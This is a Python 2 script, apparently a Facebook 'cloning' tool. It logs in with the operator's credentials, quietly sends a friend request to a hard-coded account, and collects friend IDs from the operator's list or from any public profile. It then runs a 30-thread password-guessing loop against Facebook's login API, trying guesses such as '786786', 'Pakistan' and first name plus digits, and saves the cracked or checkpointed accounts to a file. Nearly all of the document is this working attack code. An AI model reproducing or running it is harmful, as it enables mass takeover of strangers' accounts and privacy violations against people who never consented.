#!/usr/bin/python2
#coding=utf-8
#Anaya Malik
#YT Channal∆ Pata Noi
#Whatsapp:+447784693825
#The Credit For This Code Goes To Anaya Member of MyOwnBrand
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
##### LOGO #####
logo = """

\33[1;92m▶▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇◀
     \33[1;91m⚞▇▇▇▇▇▇▇▇▇═─\33[1;97mWP X +447784693825\33[1;91m─═▇▇▇▇▇▇▇▇▇⚟
     \33[1;93m⚞▇▇▇▇▇▇▇▇▇═─\33[1;94mAnaya-Bff-Sherry\33[1;93m─═▇▇▇▇▇▇▇▇▇⚟
     \33[1;94m⚞▇▇▇▇▇▇▇▇▇═─\33[1;91m𝑭𝑬𝑻𝑪𝑯𝑰𝑵𝑮 𝑫𝑨𝑻𝑨\33[1;94m─═▇▇▇▇▇▇▇▇▇⚟
     \33[1;96m⚞▇▇▇▇▇▇▇▇▇═─\33[1;93m𝑷𝑳𝑬𝑨𝑺𝑬 𝑾𝑨𝑰𝑻..\33[1;96m─═▇▇▇▇▇▇▇▇▇⚟
     \33[1;97m⚞▇▇▇▇▇▇▇▇▇═─\33[1;94m𝑰𝑵𝑺𝑻𝑨𝑳𝑳 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳𝑳𝒀\33[1;97m─═▇▇▇▇▇▇▇▇▇⚟
\33[1;92m▶▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇◀




 \033[1;93m¶      ____    __     _  _   _____ 
 \033[1;93m¶     (_  _)  /__\   ( \( ) (  _  ) 
 \033[1;93m¶       )(   /(__)\   )   (  )(_)( 
 \033[1;93m¶      (__) (__)(__) (_)\_) (_____)

        """

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mHaterzFeel█████████████████▒▒▒▒▒▒▒▒..99%\x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")


jalan("\033[1;97m•◈•──────────•◈•\033[1;92m ANAYA BFF SHERRY \033[1;96m•◈•──────────•◈•")

jalan("\033[1;97m•◈•──────────•◈•\033[1;92m Friends Forever \033[1;96m•◈•──────────•◈•")

jalan('\033[1;92m          ╔══════════════════════════╗')
jalan('\033[1;93m          ║\033[1;93m0%                \033[1;91m        ║')
jalan('\033[1;94m          ║ \033[1;93mHaterzFeel █▒▒▒▒▒▒▒▒▒    \033[1;96m║')
jalan('\033[1;95m          ║                          ║')
jalan('\033[1;96m          ║\033[1;95m10%               \033[1;92m        ║')
jalan('\033[1;97m          ║ \033[1;95mHaterzFeel ███▒▒▒▒▒▒▒    \033[1;95m║')
jalan('\033[1;96m          ║                          ║')
jalan('\033[1;95m          ║ \033[1;96m30%              \033[1;93m        ║')
jalan('\033[1;94m          ║  \033[1;96mHaterzFeel █████▒▒▒▒▒   \033[1;94m║')
jalan('\033[1;93m          ║                          ║')
jalan('\033[1;92m          ║  \033[1;94m50%             \033[1;94m        ║')
jalan('\033[1;91m          ║   \033[1;94mHaterzFeel ███████▒▒▒  \033[1;93m║')
jalan('\033[1;92m          ║                          ║')
jalan('\033[1;93m          ║   \033[1;92m99%            \033[1;95m        ║')
jalan('\033[1;94m          ║   \033[1;92mHaterzFeel █████████▒▒\033[1;92m ║')
jalan('\033[1;95m          ║                          ║')
jalan('\033[1;96m          ║    \033[1;97m100%          \033[1;96m        ║')
jalan('\033[1;97m          ║     \033[1;97mHaterzFeel ██████████\033[1;91m║')
jalan('\033[1;96m          ╚══════════════════════════╝')

jalan("\033[1;94m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;91m+447784693825\033[1;94m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑")

jalan("\033[1;94m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;91mANAYA MALIK\033[1;94m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑")

print ""
jalan("\033[1;97m•◈•───────•◈NOT JUST A NAME ITS BRAND •◈•──────•◈•")  


jalan("\033[1;97m•◈•──────────•◈•\033[1;96m ANAYA BFF SHERRY \033[1;96m•◈•──────────•◈•")

print ""
jalan("\033[1;91mENTER YOUR USERNAME & PASSWORD ")	

CorrectUsername = "Anaya"
CorrectPassword = "Malik"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m🔱 \x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;93m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;94m🔱 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Anaya-Malik
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://www.facebook.com/shehroz.khaan302')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.facebook.com/shehroz.khaan302')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		
		jalan('\033[1;93m    ⊢□■□■□■□■□■□■□■□■□■□■\033[1;94m□■□■□■□■□■□■□■□■□■□■□' )
		print ""
		jalan('. \33[1;91m ⚠ Warning ⚠ \33[1;97m[◉] \33[1;96mDo Not Use Prsonal Account \33[1;97m[◉]' )
		
		jalan('  \33[1;91m ⚠ Warning ⚠ \33[1;97m[◉] \33[1;96mLogin New Fresh Account \33[1;97m[◉]' )
		print ""
		print "\033[1;95m  •◈•──────────•◈•\033[1;97mAnaya Malik\033[1;93m•◈•──────────•◈•"
		
		jalan("\033[1;91m  INDIAN & WIFI USERZ USE ANY PROXY FOR CLONING ")	
		print ""
		jalan('\033[1;93m    ⊢□■□■□■□■□■□■□■□■□■□■\033[1;94m□■□■□■□■□■□■□■□■□■□■□' )
		
		print ""
		print('\33[1;94m⚡\33[1;94m⚞▇▇▇▇▇▇▇▇▇═─\33[1;97mLOGIN WITH FACEBOOK\33[1;94m─═▇▇▇▇▇▇▇▇▇⚟\33[1;94m⚡')
		
		id = raw_input('          \033[1;97m[◉] \x1b[1;97mID/Email ✎\x1b[1;95m: \x1b[1;91m')
		pwd = raw_input('          \033[1;97m[◉] \x1b[1;97mPassword ✎\x1b[1;91m: \x1b[1;92m')
		
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;96mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mAnaya Malik Login Successful✔✔✔'
				os.system('xdg-open https://www.facebook.com/shehroz.khaan302')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;92mYour Account is on Checkpoint ‼")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "  \033[1;91m⚞▇▇▇▇▇▇═─\033[1;93mLogged in User Info\033[1;91m─═▇▇▇▇▇▇⚟"
	print "    \033[1;92m Name\033[1;93m➤\033[1;92m"+nama+"\033[1;97m               "
	print "	  \033[1;97m ID\033[1;93m➤\033[1;93m"+id+"\x1b[1;97m              "
	print "\033[1;91m⚞▇▇▇▇▇▇▇▇▇▇▇▇▇▇═─\033[1;97mAnaya Malik\033[1;91m─═▇▇▇▇▇▇▇▇▇▇▇▇▇▇⚟"
	print "\033[1;97m➤➤\033[1;93m➲ \033[1;92m1.\x1b[1;95mAnaya Start Cloning ٜ ٜ ٜ"
	print "\033[1;97m➤➤\033[1;93m➲ \033[1;91m0.\033[1;91mExit            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;93mChoose an Option>>> \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;93m➽➽ \033[1;92m1.\x1b[1;94mCloning From Friend List"
	print "\033[1;93m➽➽ \033[1;92m2.\x1b[1;95mCloning From Public ID"
	print "\033[1;93m➽➽ \033[1;91m0.\033[1;96mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;95m⚞▇▇▇▇▇▇▇▇▇▇▇▇▇▇═─\033[1;96mAnayaMalik\033[1;95m─═▇▇▇▇▇▇▇▇▇▇▇▇▇▇⚟"
		jalan('\033[1;93mAnayaMalik██████▒▒▒▒▒..100% \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;91m[♡] \033[1;92mEnter ID\033[1;93m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;93mName\033[1;94m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;92mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;93mGetting IDs\033[1;93m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;97mTotal IDs\033[1;93m: \033[1;94m"+str(len(id))
	jalan('\033[1;93mAnaya-Malik██████▒▒▒▒▒..99%\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;92m«-----\x1b[1;95mTo Stop Process Press CTRL+Z\033[1;94m----»"
	jalan(' \033[1;93m ........Cloning Start plzzz Wait.......... ')
	print "\033[1;94m⚞▇▇▇▇▇▇▇▇▇▇▇▇▇▇═─\033[1;96mAnayaMalik\033[1;95m─═▇▇▇▇▇▇▇▇▇▇▇▇▇▇⚟"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = '786786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m☠️AnayaMalik(OK)\x1b[1;92m✉\x1b[1;92m-' + user + '-\x1b[1;92m✑\x1b[1;92m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;97m☠️AnayaMalik(CP)\x1b[1;97m✉\x1b[1;93m-' + user + '-\x1b[1;94m✑\x1b[1;95m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m☠️AnayaMalik(OK)\x1b[1;92m✉\x1b[1;92m-' + user + '-\x1b[1;92m✑\x1b[1;92m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;97m☠️AnayaMalik(CP)\x1b[1;93m✉\x1b[1;94m-' + user + '-\x1b[1;95m✑\x1b[1;96m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m☠️AnayaMalik(OK)\x1b[1;92m✉\x1b[1;92m-' + user + '-\x1b[1;92m✑\x1b[1;92m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;97m☠️AnayaMalik(CP)\x1b[1;94m✉\x1b[1;97m-' + user + '-\x1b[1;94m✑\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m☠️AnayaMalik(OK)\x1b[1;92m✉\x1b[1;92m-' + user + '-\x1b[1;92m✑\x1b[1;92m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m☠️AnayaMalik(CP)\x1b[1;93m✉\x1b[1;94m-' + user + '-\x1b[1;95m✑\x1b[1;96m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m☠️AnayaMalik(OK)\x1b[1;92m✉\x1b[1;92m-' + user + '-\x1b[1;92m✑\x1b[1;92m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;97m☠️AnayaMalik(CP)\x1b[1;93m✉\x1b[1;94m-' + user + '-\x1b[1;95m✑\x1b[1;96m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Pakistan'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m☠️AnayaMalik(OK)\x1b[1;92m✉\x1b[1;92m-' + user + '-\x1b[1;92m✑\x1b[1;92m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;97m☠️AnayaMalik(CP)\x1b[1;93m✉\x1b[1;94m-' + user + '-\x1b[1;95m✑\x1b[1;96m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m☠️AnayaMalik(OK)\x1b[1;92m✉\x1b[1;92m-' + user + '-\x1b[1;92m✑\x1b[1;92m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;97m☠️AnayaMalik(CP)\x1b[1;93m✉\x1b[1;94m-' + user + '-\x1b[1;95m✑\x1b[1;96m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"
	print "  \033[1;93m⚞▇▇▇▇▇═─Developed By Anaya-Malik-TaNo─═▇▇▇▇▇▇⚟" 
	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
	print"\033[1;92mTotal OK/\x1b[1;97mCP \033[1;92m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
	print """
          
	  
\033[1;91██████  ██       █████   ██████ ██   ██     ████████ ██  ██████  ███████ ██████  
\033[1;92██   ██ ██      ██   ██ ██      ██  ██         ██    ██ ██       ██      ██   ██ 
\033[1;93██████  ██      ███████ ██      █████          ██    ██ ██   ███ █████   ██████  
\033[1;94██   ██ ██      ██   ██ ██      ██  ██         ██    ██ ██    ██ ██      ██   ██ 
\033[1;95██████  ███████ ██   ██  ██████ ██   ██        ██    ██  ██████  ███████ ██   ██ 
                                                                                 
                                                                 
        \033[1;91m█▀██▀█─▀██▀─▀█▀────█─────▀██▄─▀█▀─▀██▀▄█▀
        \033[1;92m──██────██▄▄▄█────▄██─────██▀▄─█───███▀
        \033[1;93m──██────██───█───▄█▄██────██─▀▄█───██▀█
        \033[1;94m─▄██▄──▄██▄─▄█▄─▄█▄─▄██▄─▄██▄─▀█──▄██▄▀█▄

        \033[1;95m───────▀█▄──▄█▀──▄█▀█▄──██───██──────────
        \033[1;96m────────▀█▄▄█▀──██───██─██───██──────────
        \033[1;94m──────────██────██───██─██───██──────────
        \033[1;93m─────────▄██▄────▀█▄█▀───▀█▄█▀───────────"""
	
	raw_input("\n\033[1;92m[\033[1;94mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
